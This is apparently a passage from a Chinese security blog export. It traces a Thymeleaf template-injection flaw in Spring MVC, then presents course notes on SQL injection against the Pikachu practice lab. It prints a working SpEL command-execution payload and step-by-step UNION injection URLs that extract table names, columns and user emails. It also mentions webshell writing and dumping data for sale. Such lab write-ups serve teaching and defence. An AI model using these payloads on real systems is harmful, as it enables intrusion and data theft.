src=\"WN2EnHZ_xyLglPRq-rYXr0xtMRCmtXu5fy-30jvN4qY.png\" alt=\"image\"></p>\n<p>回到getHandler，遍历handlerMappings 列表来查找匹配的处理器（即 Controller），并返回对应的 HandlerExecutionChain 实例。下图可以看到我们的index1的Controller和内置的error Controller</p>\n<p><img src=\"lna3ce4nVCydtd8coNVnehDaYqv_pdcG3qab3DA8MQA.png\" alt=\"image\"></p>\n<p>SpringMVC一共初始化了5个处理器映射器</p>\n<p><img src=\"upJsQXDdiyNT--4vjCqs_oF5wZpxE--M10Eh2bp05dw.png\" alt=\"image\"></p>\n<p>遍历拿到了我们的一个Controller和方法名以及返回值的类型（String）</p>\n<p><img src=\"39o45C1Lf7BSmiT2B3n4TGSAHJUKMR32k_BeKrOhVuc.png\" alt=\"image\"></p>\n<p>映射器给我们处理的Handler封装到了一个叫HandlerExecutionChain里面。而在HandlerExecutionChain对象里面有一个handler对象，是HandlerMethod类型的，这就是处理器映射器最终将我们的请求处理成的Handler对象</p>\n<h3 id=\"3-获取处理器适配器HandlerAdpater\"><a href=\"#3-获取处理器适配器HandlerAdpater\" class=\"headerlink\" title=\"3.获取处理器适配器HandlerAdpater\"></a><strong>3.获取处理器适配器HandlerAdpater</strong></h3><p>回到doDispatch，继续往下走到521行，这里调用了getHandlerAdapter方法。这个步骤是</p>\n<p><img src=\"NYCpxpSlZDfNo3YQWo8WBYj_pNirXQ2_QKgLoLHOW6M.png\" alt=\"image\"></p>\n<p>我们跟进去到了getHandlerAdapter。这里是对所有适配器进行遍历，查找支持该处理程序的适配器，最终将返回第一个支持该处理程序的适配器。并执行所需操作，例如解析请求参数、调用相应的业务逻辑、生成响应等。</p>\n<p><img src=\"G-bRju-URSTl6dq17pXyv2k3DrM-AWKP71tjoXNPyAU.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获取处理器适配器    </span></span><br><span class=\"line\"><span class=\"keyword\">protected</span> HandlerAdapter <span class=\"title function_\">getHandlerAdapter</span><span class=\"params\">(Object handler)</span> <span class=\"keyword\">throws</span> ServletException &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 处理器适配器集合不为空</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.handlerAdapters != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"type\">Iterator</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.handlerAdapters.iterator();</span><br><span class=\"line\">        <span class=\"comment\">// 遍历处理器适配器集合</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(var2.hasNext()) &#123;</span><br><span class=\"line\">            <span class=\"type\">HandlerAdapter</span> <span class=\"variable\">adapter</span> <span class=\"operator\">=</span> (HandlerAdapter)var2.next();</span><br><span class=\"line\">            <span class=\"comment\">// 当前适配器是否支持handle处理器的处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (adapter.supports(handler)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 返回支持的适配器</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> adapter;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 未找到合适的适配器，抛出异常</span></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServletException</span>(<span class=\"string\">&quot;No adapter for handler [&quot;</span> + handler + <span class=\"string\">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>SpringMVC为我们初始化了以下4个处理器适配器：</p>\n<p><img src=\"tOgIA6c-N2YWDqhwtn2Qbk7k5AghIR-hZCq0HiuS8R4.png\" alt=\"image\"></p>\n<p><img src=\"A_6Jj_ulqGpI4sKH_XdvJLnanMb4cRytlb1jsAMEOzs.png\" alt=\"image\"></p>\n<p>回到doDispatch，继续往下走到531行。判断在请求发生之前有没有预处理拦截器。预处理拦截器一般用于身份验证、授权、日志记录等。</p>\n<p><img src=\"Ha3472ZAU3rQBGcGGP4zuBF0aBIrZCuyVVr2_KdlX4k.png\" alt=\"image\"></p>\n<h3 id=\"4-处理器适配器对Handler进行处理\"><a href=\"#4-处理器适配器对Handler进行处理\" class=\"headerlink\" title=\"4.处理器适配器对Handler进行处理\"></a><strong>4.处理器适配器对Handler进行处理</strong></h3><p>继续往下走到535行。从 mappedHandler对象获取handler对象，然后将其与请求(request)对象、响应(response)对象交给适配器(Adapter)进行调用。在适配器中调用处理程序的相应方法，通常是Controller中的某一个方法，并根据业务逻辑生成响应数据。最终结果存储在ModelAndView实例对象(mv)中。</p>\n<p><img src=\"mz9s1yEdL-un_gS7yP3V-vF9G0Lz8hCmnwX-8V47Z7w.png\" alt=\"image\"></p>\n<p>我们跟进去</p>\n<p><img src=\"64U7bf16Iv-0R3x8a2du3TE39qHgVByo-r2YFHPJGEA.png\" alt=\"image\"></p>\n<p>来到了RequestMappingHandlerAdapter类的handleInternal方法。首先是对请求进行检查(checkRequest)，接着调用invokeHandlerMethod函数执行处理程序(handlerMethod)的方法，并根据业务逻辑生成响应数据。最后，根据配置条件设置缓存控制(Cache-Control)头部信息并返回ModelAndView实例对象(mav)。</p>\n<p><img src=\"fgZ2tlRIQiY911Vkc4MqM2m2gWGsbvHtAaz5M9uZS9U.png\" alt=\"image\"></p>\n<p>来到invokeHandlerMethod(487)，我们跟进去。前面这些是根据请求参数，生成一个Web数据绑定器工厂(binderFactory)和模型工厂(modelFactory)。</p>\n<p><img src=\"zRxC97t-uBwsshqxp42aD7YC_Ch9qSmaLYnOEYP8lTg.png\" alt=\"image\"></p>\n<p>我们来到552行的invocableMethod.invokeAndHandle。它是用于执行处理程序(handlerMethod)的方法。我们跟进去；首先是调用invokeForRequest方法，该方法是实现@RequestBody注解的功能，将http请求报文解析为我们设置的对象。</p>\n<p><img src=\"9rAHyXBKXO7Id7wUFJfOugU6jeHVQMkCY2BBXqsawas.png\" alt=\"image\"></p>\n<p>我们跟进去；首先通过getMethodArgumentValues方法获取处理程序所需的参数，如日志所示，代码将请求参数打印到日志中。然后通过doInvoke方法执行接口的具体业务逻辑代码。</p>\n<p><img src=\"SxJ-W5GrA7Lj7xK4I422RDDOLz3N5jVL2pifCfV-2ig.png\" alt=\"image\"></p>\n<p>跟进61行的doInvoke，进入到里面。 获得被桥接的⽅法（101），开打访问权限（102）</p>\n<p><img src=\"hDXsDmsQ8OKUP42Lt9CpkO3o3phgis_SN1CBQtWKIFY.png\" alt=\"image\"></p>\n<p>这里的105行，调用了invoke。通过反射，调⽤ Controller 中响应的⽅法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> KotlinDetector.isSuspendingFunction(method) ? CoroutinesUtils.invokeSuspendingFunction(method, <span class=\"built_in\">this</span>.getBean(), args) : method.invoke(<span class=\"built_in\">this</span>.getBean(), args);</span><br></pre></td></tr></table></figure>\n<p>最后通过反射进行调用。先是检查调用者对方法的访问权限，并获取需要调用方法的MethodAccessor实例，最后调用MethodAccessor的invoke方法来执行相应的方法。</p>\n<p><img src=\"Q1ujRJo4a6PB82VUNdfQm3z1sknvesEAVhwQWRjE19c.png\" alt=\"image\"></p>\n<p>最终回到invokeHandlerMethod，进入到了if里面getModelAndView(554)。</p>\n<p><img src=\"Rxha9Q6rsoH1nWYawYNyaeVr5A09eKm-tMiZy0CpWnc.png\" alt=\"image\"></p>\n<p>我们跟进去看看；这里是根据mavContainer对象（包含视图名称、数据模型等信息）创建并返回ModelAndView对象</p>\n<p><img src=\"v6mT0K9RBwObIUIOod4qs6UuXvkrI6rcll8eMSoPwWA.png\" alt=\"image\"></p>\n<p>至此，我们就拿到了mav，也就是ModelAndView </p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">[view=<span class=\"string\">&quot;__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;</span>open -a Calculator<span class=\"string\">&quot;).getInputStream()).next()&#125;__::.x&quot;</span>; model=&#123;&#125;]</span><br></pre></td></tr></table></figure>\n<p><img src=\"VmLlO7DWY78gR-N4G226bRLW3ViXKVYYVnCmm_kVfQc.png\" alt=\"image\"></p>\n<p>最终回到doDispatch，然后来到540行。</p>\n<p>这里调用请求处理器适配器的postHandle()方法，对Web请求在处理完成后做一些额外的工作，比如在模型和视图参数中添加、删除或修改属性值等，以及对响应对象进行操作，比如设置相应头信息、状态码以及重定向等</p>\n<p><img src=\"XxxuU2r4n3E1mhBz98cQ8EpO5e5cyQvEXA3CS5H3Jcs.png\" alt=\"image\"></p>\n<h3 id=\"5-处理派发结果\"><a href=\"#5-处理派发结果\" class=\"headerlink\" title=\"5.处理派发结果\"></a>5.处理派发结果</h3><p>SpringMVC通过处理器适配器将Handler处理成ModelAndView了。</p>\n<p>下面我们来看到548行</p>\n<p><img src=\"hArY-lvFyp6UFLRTBFmoJ7epnCYupS_c2aCT3w8ZhWE.png\" alt=\"image\"></p>\n<p>我们跟进去看看，processDispatchResult方法实现了请求的分发以及结果的处理。在具体工作中，该方法接收HTTP请求和响应对象、当前匹配到的HandlerExecutionChain处理链、可能存在的ModelAndView模型视图对象以及处理过程中可能抛出的异常等参数，然后根据不同情况，调用相应的方法进行处理。</p>\n<p><img src=\"6LaA8CBRDPXwcBkWLW8Np83AKH9CBoWQcPUdeEVStdU.png\" alt=\"image\"></p>\n<p>搜索发现，有一个叫render的方法对mv进行处理，我们跟进去。</p>\n<p><img src=\"BLLiYnuYt1DGvjZPJyZz3usS8B6dg2M3nbb_jeps36o.png\" alt=\"image\"></p>\n<p>750行获取View视图对象，进去看看。循环遍历初始化好的视图解析器进行解析处理，最终得到一个View视图对象</p>\n<p><img src=\"dASw_k2xVTOLT47G7ts2HTUS_p_mOzxMqupOXiozV6E.png\" alt=\"image\"></p>\n<p>回到render；来到770行，我们跟进去看看。</p>\n<p>这里调用了renderFragment方法</p>\n<p><img src=\"h9ffxi7Kg30LTUg5Nc9oxdQv8kWJr1ZbGWdEZL7AsxU.png\" alt=\"image\"></p>\n<p>继续跟进去renderFragment；在101行，判断viewTemplateName是否包含::如果包含的话进入else分支，进行表达式预处理。</p>\n<p>首先是传入configuration 对象作为参数，获取一个标准表达式解析器对象parser；然后是通过在 parser对象上调用 parseExpression() 方法，传入两个参数：当前渲染的页面上下文对象 context 和表示要渲染的 HTML 片段名称的字符串 “~{ + viewTemplateName + }”，得到一个 FragmentExpression 对象 fragmentExpression</p>\n<p><img src=\"TCrWTzmvZz2PUxJuax8-p7QwkNJ32uWS0ZR0Mpr7TwQ.png\" alt=\"image\"></p>\n<p>此时的viewTemplateName为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">__$&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class=\"string\">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>\n<p>viewTemplateName中包含::时，会给其加上~{}然后进行解析</p>\n<p><img src=\"QfzEJJwG2yPvKX6iPU5Zt1vI9B26heyMZlu0i1nzDf8.png\" alt=\"image\"></p>\n<p>parseExpression(109) 我们跟进去看看</p>\n<p><img src=\"Zz-P7UCZAzQ-ITKSeQtqYMXG0xw907ctzUqal1LTuxU.png\" alt=\"image\"></p>\n<p>跟进去preprocess。进行正则提取出__…__之间的东西</p>\n<p><img src=\"Glzsvp8QC3KxO_D6SqF4-rxzC7arF-ymCxjo6WyQh5o.png\" alt=\"image\"></p>\n<p>提取得到的</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class=\"string\">&quot;open -a Calculator&quot;</span>).getInputStream()).next()&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"IWGmVxzna6lKOKC953_kqmMj2BPxXnODz7vKo4WCwr0.png\" alt=\"image\"></p>\n<p>然后调用expression.execute（42）</p>\n<p><img src=\"XCNeHvySqccF4wE9w2m6Zft4aD4TJsVUxiVTxBn2euQ.png\" alt=\"image\"></p>\n<p>我们跟进来发现又调用了另一个execute，把this（payload）传进去。</p>\n<p><img src=\"Yi0NliqI420ww5cXZB7tt63D55M2496Ap2ewqBAMvOM.png\" alt=\"image\"></p>\n<p>我们跟进去，一进来就发现第一个if对expression 对象进行类型检测，判断表达式类型是否为 SimpleExpression。这里确实是SimpleExpression，所以调用SimpleExpression.executeSimple进行了执行。</p>\n<p><img src=\"eqE5ZF37w9-TAeou6RLtr7CysxxDD7qMqaAgM23wT2g.png\" alt=\"image\"></p>\n<p>SimpleExpression.executeSimple执行spel表达，成功弹计算器。</p>\n<p><img src=\"FrYU4DJ8NxtpUSPbr2Jti7AuRb8UVhnrVEGasNqltLc.png\" alt=\"image\"></p>\n<p><img src=\"kzystS4Asr-inkRBPQ1i6uhzgS3WHLQMpryrtVhag3M.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>这个漏洞的复现，很多工作都是在跟进SpringMvc的一个工作流程。需要对SpringMvc的工作流程了解，和SpringMvc的九大初始化组件了解，才得以进一步追踪污染传播的方法以及整个流程。</li>\n<li>在通过render 渲染进行视图渲染的时候，会先检测是否包含“::”，然后进入分支添加上~{}进行解析。解析前进行预处理，即通过正则取出两个横线之间的内容，然后调用标准解析器对其进行解析，匹配到了spel表达式，从而导致了spel表达式命令执行。</li>\n</ul>\n<p><img src=\"o27q8Sx0mxQMudsxOj5utgUcxpEht3cqcsFU6R3mogU.png\" alt=\"image\"></p>\n<h2 id=\"修复方式\"><a href=\"#修复方式\" class=\"headerlink\" title=\"修复方式\"></a>修复方式</h2><ul>\n<li>升级版本</li>\n<li>配置 <code>@ResponseBody</code> 或者 <code>@RestController</code></li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">这样 spring 框架就不会将其解析为视图名，而是直接返回, 不再调用模板解析。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在返回值前面加上 “redirect:”</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">这样不再由 Spring ThymeleafView来进行解析，而是由 RedirectView 来进行解析。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在方法参数中加上 HttpServletResponse 参数</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/weixin_43263451/article/details/126543803\">https://blog.csdn.net/weixin_43263451&#x2F;article&#x2F;details&#x2F;126543803</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw\">https://mp.weixin.qq.com/s/u2ooYhAZ0Elbe02PDNQBWw</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A\">https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","模板注入"]},{"title":"day2-web安全基础一（上午：SQL注入、XSS、SSRF）","url":"/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/","content":"<h1 id=\"day2-web安全基础一（上午：SQL注入、XSS、SSRF）\"><a href=\"#day2-web安全基础一（上午：SQL注入、XSS、SSRF）\" class=\"headerlink\" title=\"day2-web安全基础一（上午：SQL注入、XSS、SSRF）\"></a>day2-web安全基础一（上午：SQL注入、XSS、SSRF）</h1><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>SQL注入这种攻击方式中，恶意代码被插入到字符串中，然后该字符串传递到SQL Server的实例以进行分析和执行。任何构成SQL语句的过程都应进行注入检查，因为SQL Server将执行其接收到的所有语法有效的查询。</p>\n<p>注入攻击的本质，是把用户输入的数据当做代码执行。</p>\n<p>这里有两个关键条件：</p>\n<p>第一个是用户能够控制输入</p>\n<p>第二个是原本程序要执行的代码，拼接了用户输入的数据</p>\n<p>危害：拖数据、写shell（特定情况下），获取管理员的账号密码等</p>\n<p>SQL 注入原理演示</p>\n<p>用户登录的基本 SQL 语句： </p>\n<p>select * from users where username &#x3D; ‘用户输入的用户名’ and password &#x3D; ‘用户输入的密码’ </p>\n<p>用户输入的内容是可控的，例如我们可以在用户名中输入’ or 1&#x3D;1 –空格 </p>\n<p>select * from users where username &#x3D; ‘’ or 1&#x3D;1 –空格 ‘and password &#x3D; ‘用户输入的密码’ </p>\n<p>此时我们输入的第一个单引号将 username 的单引号闭合，相当于输入了一个空用户，</p>\n<p>or 表示左右 两边只要有一边条件判断成立则该语句返回结果为真，其中 1&#x3D;1 永远为真，所以当前 SQL 诧句无论怎么 执行结果永远为真，–空格表示注释，注释后面所有代码不再执行。 </p>\n<p>我们可以看到上面我们闭合的方法是没有输入用户名的，所以并不能成功登陆</p>\n<p> select * from users where username &#x3D; ‘admin’ or 1&#x3D;1 –空格 ‘and password &#x3D; ‘用户输入的 密码’ </p>\n<p>我们在单引号前面加上用户名表示我们要登陆的用户。这样就成功绕过了用户密码认证。 </p>\n<p>单引号的作用： 在提交数据或者 URL 中添加单引号进行提交如果返回 SQL 错误即可判断当前位置存在 SQL 注入漏洞。 原因是没有被过滤。 </p>\n<h3 id=\"SQL-注入的分类\"><a href=\"#SQL-注入的分类\" class=\"headerlink\" title=\"SQL 注入的分类\"></a>SQL 注入的分类</h3><p>SQL 注入的分类基本上都是根据在注入的方式进行分类，</p>\n<p>大概分为以下 4 类 </p>\n<p>1、布尔注入：可以根据返回页面判断条件真假的注入；</p>\n<p> 2、联合注入：可以使用 union 的注入； </p>\n<p>3、延迟注入：不能根据页面返回内容判断任何信息，用条件 语句查看时间延迟语句是否执行（即页面 返回时间是否增加）来判断； </p>\n<p>4、报错注入：页面会返回错诨信息，或者把注入的   语句的结果直接返回在页面中； 以上是根据常见的注入方式进行分类，但是通常杢说 SQL 注入只分为字符型戒者数字型比如： 数字型 1 or 1&#x3D;1 字符型 1’ or ‘1’&#x3D;’1</p>\n<p>5、宽字节等</p>\n<h3 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h3><p>sqli_x.php  </p>\n<h4 id=\"正常\"><a href=\"#正常\" class=\"headerlink\" title=\"正常\"></a>正常</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"DaxH23T5vQuc7bDe0wA08Fe5I0LzcfG_M1PKWXbQAys.png\" alt=\"image\"></p>\n<p>参数说明： ？表示传递参数，通常都是在页面后会有？name&#x3D;用户，这样的方式传递参数给服务器，然后给我们返回参数对应的页面信息</p>\n<h4 id=\"注入点\"><a href=\"#注入点\" class=\"headerlink\" title=\"注入点\"></a>注入点</h4><p>添加了一个单引号之后，发现了报错。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?name=1&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"qTAYJouyalqoXq3TdJ_823_VdOcYUjwm-668dxnvSZU.png\" alt=\"image\"></p>\n<h4 id=\"找显位\"><a href=\"#找显位\" class=\"headerlink\" title=\"找显位\"></a>找显位</h4><p>ORDER BY 关键词用亍对记录集中的数据进行排序。 </p>\n<p>用法 1：按某个字段进行排序： </p>\n<p>语法：select 字段 1，字段 2 from 表名 order by 字段名; </p>\n<p>用法 2：按第几个字段进行排序，如果超过表中的字段数，就报错 </p>\n<p>语法：select 字段 1，字段 2 from 表名 order by 数字;</p>\n<p>3的时候不正常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20order%20by%203--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bJz56QHKef4bLlGNWMtIovOUJC9-0fmqqhZRxfMNoLk.png\" alt=\"image\"></p>\n<p>2的时候正常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20order%20by%202--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"stmHs2VBJNWNkfcZtVIAI8WBQw7We10gT_c-pj99wdg.png\" alt=\"image\"></p>\n<p>说明这个查询语句中，就查询了两个字段的内容而已。</p>\n<p>查找显示的位置。</p>\n<h4 id=\"数据库名\"><a href=\"#数据库名\" class=\"headerlink\" title=\"数据库名\"></a>数据库名</h4><p>union：用于合并两个或多个select语句的结果集，并消去表中任何重复行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,sex from member <span class=\"type\">where</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> union select <span class=\"number\">1</span>,version();</span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,version()--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"TpoKiaIgan3Egen16em7AVDy6ng_i3rt-o7_FioNrjQ.png\" alt=\"image\"></p>\n<p><img src=\"rG-5cSrnPP5TzKEyKVRfBxbMOELQ_6vyiC2qXIhpo3c.png\" alt=\"image\"></p>\n<h4 id=\"查询库名\"><a href=\"#查询库名\" class=\"headerlink\" title=\"查询库名\"></a>查询库名</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,database()--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"9laWhqETZqINvqYexcIVReJgiim3dtBL0_jdu4xBJsI.png\" alt=\"image\"></p>\n<h4 id=\"表名\"><a href=\"#表名\" class=\"headerlink\" title=\"表名\"></a>表名</h4><p>先来了解information_schema，这是MySQL 自带的一个元数据库，用于存储MySQL 的数据结构。</p>\n<p>元数据则是用于描述数据本身的数据，称为元数据，包含了，MySQL 当中有多少个数据库，这些数<br>据库的名称是什么，每个数据库里有多少个表，具体的表名叫什么<br>而 information_schema 这个库里又存放了很多个表，这些表里的不同字段表示 MySQL 中的相关信息。而我们也可以通过 information_schema 和以上我们学习到的注入使用方式去查询更多的信息</p>\n<p>例：</p>\n<p>查看 information_schema 库中 tables 表中 table_schema 等于 pikachu 的相关信息</p>\n<p>select table_schema,table_name from information_schema.tables where table_schema&#x3D;’pikachu’;</p>\n<p>注：information_schema 库中的 tables 表的字段解释：</p>\n<p>table_schema #该字段存储数据库名 ；</p>\n<p>table_name #该字段存储对应数据库中的包括的表名</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,sex from member <span class=\"type\">where</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> union select <span class=\"number\">1</span>,table_name from information_schema.tables where table_schema=<span class=\"string\">&#x27;pikachu&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"W0cWHdNBZeUlGrJfBbb8Aa1hKcsQX0BKaT4K5_qqs5U.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=%27pikachu%27;--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"t2vm7gF97GAbYzNEHB4ZfiCk9vwda-lf8V4k1b7Aog8.png\" alt=\"image\"></p>\n<p>字段名</p>\n<p>例：</p>\n<p>查看information_schema.columns 表中的字段 table_name 等于member的相关信息</p>\n<p>select table_schema,table_name,column_name from information_schema.columns where table_name&#x3D;’member’;</p>\n<p>注：information_schema 库中的 tables 表的字段解释：</p>\n<p>table_schema #该字段存储数据库名 ；</p>\n<p>table_name #该字段存储对应数据库中的包括的表名</p>\n<p>column_name##该字段存储对应表中的字段</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,sex from member <span class=\"type\">where</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> union select <span class=\"number\">1</span>,column_name from information_schema.columns where table_name=<span class=\"string\">&#x27;member&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"H3nwV5ZBF9dqzGBDqWYhruOgn6vfCwBVFFrKxtyppmA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_name=%27member%27--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bMc3wKAtVu0r_JuUANbeBwn6Hs0ewMx10JiQ--IKgWY.png\" alt=\"image\"></p>\n<h4 id=\"注入完成\"><a href=\"#注入完成\" class=\"headerlink\" title=\"注入完成\"></a>注入完成</h4><p>知道了一下数据：</p>\n<p>库名：pikachu</p>\n<p>表明：member</p>\n<p>字段名： id</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=3%27%20union%20select%201,email%20from%20member--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Ws4tg0f8nMdWIS3xf0qcgxPkt4gyU0Ua0fZ6AZydCiQ.png\" alt=\"image\"></p>\n<p>查询其它数据库的内容等</p>\n<h4 id=\"练习\"><a href=\"#练习\" class=\"headerlink\" title=\"练习\"></a>练习</h4><p>搜索型注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#判断</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,3--+</span></span><br><span class=\"line\">#查字段名</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,database()--+</span></span><br><span class=\"line\">#查表名</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,table_name%20from%20information_schema.tables%20where%20table_schema=%27pikachu%27;--+</span></span><br><span class=\"line\">#查字段名</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,column_name%20from%20information_schema.columns%20where%20table_name=%27member%27;--+</span></span><br><span class=\"line\">#查询全部的邮箱</span><br><span class=\"line\">http:<span class=\"comment\">//192.168.88.104:8088/vul/sqli/sqli_search.php?submit=%E6%90%9C%E7%B4%A2&amp;name=123%27%20union%20select%201,2,email%20from%20member--+</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n<h3 id=\"挖掘方法\"><a href=\"#挖掘方法\" class=\"headerlink\" title=\"挖掘方法\"></a>挖掘方法</h3><p>常见的存在于前端的动态传参的地方，新闻页面，产品页面等，以及用户登录等地方。一切与数据库有交互的地方有有可能存在SQL注入漏洞。</p>\n<p>寻找注入点–&gt;判定字段数–&gt;寻找回显点–&gt;联合查询数据库名–&gt;联合查询表名–&gt; 联合查询字段名–&gt;注出想要的数据</p>\n<p>扩展，sql注入写shell，自动化渗透，sqlmap</p>\n<p>      1.存在SQL注入漏洞</p>\n<p>　　2.web目录具有写入权限</p>\n<p>　　3.找到网站的绝对路径</p>\n<p>　　4.secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</p>\n<h3 id=\"常用利用方法\"><a href=\"#常用利用方法\" class=\"headerlink\" title=\"常用利用方法\"></a>常用利用方法</h3><p>1.获取数据库的敏感数据，如管理员的账号密码等</p>\n<p>2.脱裤，dump下来整个数据库的信息，进行非法售卖</p>\n<p>3.写shell，写入木马进行进一步的攻击</p>\n<h3 id=\"修复方法\"><a href=\"#修复方法\" class=\"headerlink\" 